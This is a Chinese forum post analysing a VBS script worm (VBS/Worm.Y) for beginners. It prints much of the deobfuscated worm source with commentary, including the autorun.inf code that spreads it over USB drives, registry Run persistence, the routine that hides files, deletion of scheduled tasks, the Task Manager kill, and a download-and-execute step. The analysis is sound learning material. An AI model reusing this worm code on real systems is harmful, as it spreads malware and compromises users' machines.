
# [原创]VBS/Worm.Y简单分析

之前没接触过VB，看了2天，死了好多脑细胞...终于把它解出来了，拿出来和大家分享一下。菜文没什么水平，新手可以看一下，共同进步![](https://bbs.kanxue.com/view/img/face/1.gif)

病毒名称：`.vbs`

病毒类型: VBS/Worm.Y

MD5: 64ea1c0e8f653984f0fde25b77f8494f

此病毒是VBS脚本病毒，多重加密，通过U盘进行传播感染，设置注册表自启动，每过一段时间运行，通过设置特定条件，进行其他恶意行为。网上下载其他恶意程序并执行。破坏系统隐藏属性。

附件密码：vbs

## VBS病毒分析

病毒名称：`.vbs`

MD5: 64ea1c0e8f653984f0fde25b77f8494f

此病毒是VBS脚本病毒，多重加密，通过U盘进行传播感染，设置注册表自启动，每过一段时间运行，通过设置特定条件，进行其他恶意行为。网上卸载其他恶意程序并执行。破坏系统隐藏属性。

### 整理一下主主体代码：

``` 
j="\"

:til="SY"									‘autorun.inf中的节名

:btj=900:

vs=".vbs"									

:ve=".vbe"

:cm="%comspec% /c "						‘cmd

:dfo="/u#t/"

:inf="\autorun.inf"							‘自启动文件







set ws=createobject("wscript.shell"):

set fso=createobject("scripting.filesystemobject")

set wmi=getobject("winmgmts:\\.\root\cimv2"):

set sis=wmi.execquery("select * from win32_operatingsystem")

set dc=fso.drives:

set ats=wmi.execquery("select * from win32_service where name='Schedule'")

for each atc in ats:

	cat=atc.state:

	next:



if cat="Stopped" then ws.run "net start ""task scheduler""",0,false

        ouw=wscript.scriptfullname:		'scriptfullname

win=fso.getspecialfolder(0)&j:			'C:\WINDOWS

dir=fso.getspecialfolder(1)&j			    'C:\WINDOWS\system32

tmp=fso.getspecialfolder(2)&j:			'C:\DOCUME~1\ADMINI~1\LOCALS~1\Temp

wbe=dir&"wbem\":

mir=left(ouw,len(ouw)-len(wscript.scriptname))

cnr="\computername":

cnp="HKLM\system\currentcontrolset\control"&cnr&cnr&cnr:

cna=rr(cnp,0):

if cna="" then cna=til

wsc="wscript.exe"

csc="cscript.exe"

css=csc&" //nologo "

wsr=rn&":createobject(""wscript.shell"").run"

c=vbcrlf



'-----------------inc------------------------

'SY'[autorun]

'open=wscript.exe .\.vbs'shell\open\command=wscript.exe .\.vbs

'shell\open\default=1

inc=til&c&"[autorun]"&c&"open="&wsc&" .\"&vs&c&"shell\open\command="&wsc&" .\"&vs&c&"shell\open\default=1"

'-----------------inc------------------------



sf="shell folders\":

rop="\software\microsoft\windows\currentversion\explorer\":

dap=rr("HKCU"&rop&sf&"desktop",0)&j		'C:\Documents and Settings\Administrator\桌面\

rpa="HKLM\software\"&cna&j:			'HKLM\software\QUBY-9B3768E839\

fsp=rr("HKLM"&rop&sf&"common startup",0)&j&vs:  'C:\Documents and Settings\All Users\「开始」菜单\程序\启动\.vbs

fap=rr("HKCU"&rop&sf&"favorites",0)&j		'C:\Documents and Settings\Administrator\Favorites\

ht=ec("ivwt?56"):										'http"\\

ha=ec(":;9:7>5kw9"):									'****.cn/

hb=hl&"1;<<=6x"&hl&"r;"								'|1;<<=6x|r;

hc="0dwuEpE":										'0dwuEpE

hd=ec("$"+hc):										'#.asp?i=

he=ec("c"+hc)											'b.asp?i=

rsp="HKLM\software\microsoft\windows\currentversion\"

rsb=rsp&"run\":rsp=rsp&"policies\explorer\run\"&cna

hip="HKCU"&rop&"advanced\showsuperhidden"

sz=lcase(fso.getfilename(wscript.fullname))



if mir=dir then sys=true

for each si in sis:

	ca=si.caption:

	cs=si.codeset:

	cc=si.countrycode:

	os=si.oslanguage:

	wv=si.version:

next

if instr(wv,"5.2")<>0 then hb="w"+hb:lb="v" else if os<>2052 and cc<>86 then hb="p"+hb:lb="o" else hb="d"+hb:lb="c"

for each d in dc

	if mir=d&j then ws.run "explorer "&d,3,false:bir=true

next



'判断文件路径是否在磁盘根目录或"C:\WINDOWS\system32\wbem\"或"C:\WINDOWS"下

'如果不是就退出

if bir or sys or mir=win or mir=wbe then tir=true else wscript.quit





ouc=rt(ouw,-1):				'读取本身代码

ver=gv(ouw):					‘版本验证



‘如果版本验证失败,则弹出“See You”消息框,执行km函数，参数为1

‘验证成功执行km函数,参数为0,km是主要感染函数

if ver="" or not isnumeric(ver) then msgbox("See You!"):km 1 else km 0

if sys then 

if sz=wsc then pr csc,-1

if pr(csc,2)=1 then wscript.quit

wscript.sleep 2000

if pr(csc,1)=0 then ws.run css&dir&ve,0,false:if pr(csc,1)=1 then wscript.quit

if rr("til",1)<>til then wr "til",til:wr "tjs",btj:wr "djs",date-1:wr "ded",0

djs=rr("djs",1):if isdate(djs) and date-cdate(djs)>50 and lb<>"o" then wr "osw",4

‘如果读取atd项注册表为1,那么删除所有计划任务

if rr("atd",1)=1 then ws.run "at /d /y",0,false:wr "atd",0

‘如果在temp文件夹存在le文件，那么执行

le=rr("dna",1):if ei(tmp&le,1) then ws.run tmp&le

cu:er 10

else

wscript.sleep 5000

if pr(wsc,2)=2 then:if rr("tjc",1)=cstr(date) then:wscript.quit:else:wr "tjc",date

if pr(csc,1)<>1 or pr(wsc,1)=0 then bf dir&ve,ouc,7:ws.run css&dir&ve,0,false

end if
```

### 3. 下面主要病毒思路，其他细节请看各个函数吧>\_<

#### (1) 判断文件路径是否在磁盘根目录或`C:\WINDOWS\system32\wbem\`或`C:\WINDOWS`下，如果不是就退出。

``` 
if bir or sys or mir=win or mir=wbe then tir=true else wscript.quit

ouc=rt(ouw,-1):				'读取本身代码

ver=gv(ouw):					‘进行验证
```

#### (2) 如果上面验证错误，那么回弹出“See You”消息框，之后执行`km()`函数，参数为1，否则参数为0。这里是anti，也是为了防止编译成exe文件。

``` 
if ver="" or not isnumeric(ver) then msgbox("See You!"):km 1 else km 0
```

#### (3) 在`km()`函数中，把病毒体拷贝到`%SYSTEM32%`目录下，并执行。然后下载文件并执行。

执行`%SYSTEM32%`下的`.vbe`：

``` 
if pr(csc,1)=0 then ws.run css&dir&ve,0,false:
```

`km()`函数说明：`sw=1`反解密，执行自删除；`sw=0`正常执行，创建文件，设置文件属性并执行，下载文件并执行。

``` 
function km(sw):

on error resume next

'rsp=HKLM\software\microsoft\windows\currentversion\policies\explorer\run\QUBY-9B3768E839

'rpa=HKLM\software\QUBY-9B3768E839\

'win&ve=C:\WINDOWS\.vbe

'wbe&ve=C:\WINDOWS\system32\wbem\.vbe

'dir&vs=C:\WINDOWS\system32\.vbs

.如果sw为1的话，进行删除文件，把所有病毒文件都删除，然后程序退出

if sw=1 then

df fsp:wr rsp,-1:wr rpa,-1:us -1:df ouw:df win&ve:df dir&ve:df wbe&ve:wscript.quit

elseif sw=-1 then

bf dir&vs,nec,7:ws.run dir&vs

else

'hip=HKCU\software\microsoft\windows\currentversion\explorer\advanced\showsuperhidden	

‘设置文件超级隐藏

ws.regwrite hip,"0","REG_DWORD":ar ouw,7

if gv(dir&ve)<>ver then bf dir&ve,ouc,7

msgbox dir&ve

if gv(wbe&ve)<>ver then bf wbe&ve,ouc,7

msgbox wbe&ve

‘如果

if rr(rsp,0)<>ve then ws.regwrite rsp,ve,"REG_SZ"

if rr(rsp,0)<>ve and not ei(fsp,1) then bf fsp,wsr&" """&ve&"""",0 else df fsp

end if

end function:
```

因为在`km()`函数中有执行病毒文件，这样病毒会一直执行，文件属性修改不了。破坏文件隐藏属性。

其中写入了几个注册表。

`HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\explorer\run\QUBY-9B3768E839` 键值为`.vbe`

`HKEY_LOCAL_MACHINE\SOFTWARE\QUBY-9B3768E839`

键值为:

![](https://bbs.kanxue.com/upload/attach/201405/618019_d9eur2qz0l1osos.png)

`HKCU_\software\microsoft\windows\currentversion\explorer\advanced\showsuperhidden` 键值为 0.

执行`cu()`函数，判断`superhidden`是否被更改过，若更改，写入注册表，并删除`auturun.inf`和病毒文件。`cu()`函数中执行了`us()`函数。

#### `cu()`函数 - 感染可移动磁盘，结束任务管理器

``` 
'cu函数 -感染可移动磁盘，结束任务管理器

function cu():

on error resume next

dcu=rr("tgs",1)<>cstr(date) and rr("osw",1)<>4

do

sec=second(time):if (sec mod 5)=0 then if dcu then us 1 ‘执行us函数,感染可移动磁盘，

if (sec mod 20)=0 then

km 0

min=minute(now):if (min mod 2)=0 and nn<>min and oo<>1 then nn=min:oo=gt 

'gt函数	下载文件并执行，写注册表



if rr("tsw",1)=1 then execute(uc(rr("tco",1)))

end if

wscript.sleep 999

if rr(hip,0)=1 and dcu then wr "tgs",date:us -1:dcu=false

‘结束任务管理器

if pr("taskmgr.exe",1)=1 then:ws.run "at "&time+0.003&" /interactive "&ve,0,false:wr "atd",1:km 0:wscript.quit

loop:cu

:end function
```

#### `us()`函数 - 感染可移动磁盘，写入`autorun.inf`文件，写入病毒体

当`sw=-1`时，删除`autorun.inf`文件。

``` 
function us(sw):

on error resume next

‘遍历磁盘，找到类型为3

for each d in dc

if d.drivetype=3 or (d.drivetype=1 and d<>"A:" and d<> "B:") then

if sw=1 then

‘创建autorun.inf文件

if ei(d&inf,2) then df d&inf

‘把病毒文件复制到可移动磁盘中去

if ei(d&j&vs,1) and ei(d&inf,1) then

if rt(d&inf,1)<>til then bf d&inf,inc,7:bf d&j&vs,ouc,7

else

bf d&inf,inc,7:bf d&j&vs,ouc,7

end if

elseif sw=-1 then:df d&inf:df d&j&vs

else:bf d&j&vs,wsr&"(left(wscript.scriptfullname,3)),3"&string(10000,"'"),7:df d&inf

end if

end if

next

end function:
```

#### 最后分析其它几个函数：

##### `rr()`函数是读取`QUBY-9B3768E839`下的键值

``` 
function rr(rna,pa):

on error resume next

'rpa -> HKLM\software\QUBY-9B3768E839\

if pa=1 then rna=rpa&rna

rr=ws.regread(rna)

if er(0) then rr=0

end function:
```

##### `wr()`函数

参数`rda`为`-1`时删除注册表项，否则写注册表。

`rpa -> HKLM\software\QUBY-9B3768E839\`

``` 
function wr(rna,rda):

on error resume next

if rda=-1 then ws.regdelete rna else ws.regwrite rpa&rna,rda,"REG_SZ"

end function:
```

##### `bf()`函数创建文件

``` 
function bf(wh,wt,da):

on error resume next

df wh:set i=fso.createtextfile(wh,true):i.write wt:i.close:ar wh,da:if not er(0) then bf=1

end function:
```

##### `df()`函数删除文件或文件夹
